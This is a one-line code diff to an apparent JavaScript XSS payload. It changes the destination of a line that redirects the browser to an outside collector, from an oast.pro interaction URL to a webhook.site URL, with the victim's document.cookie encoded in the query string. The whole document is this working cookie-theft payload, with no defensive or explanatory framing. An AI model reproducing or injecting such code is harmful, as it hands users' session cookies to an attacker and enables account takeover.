@@ -1,1 +1,1 @@
-document.location = "https://636d3e53149aec89ed0bguqwn7eyyyyyn.oast.pro/?cookie=" + encodeURIComponent(document.cookie);
+document.location = "https://webhook.site/fa92510e-bd4c-4166-8215-00bc3fa41944/?cookie=" + encodeURIComponent(document.cookie);
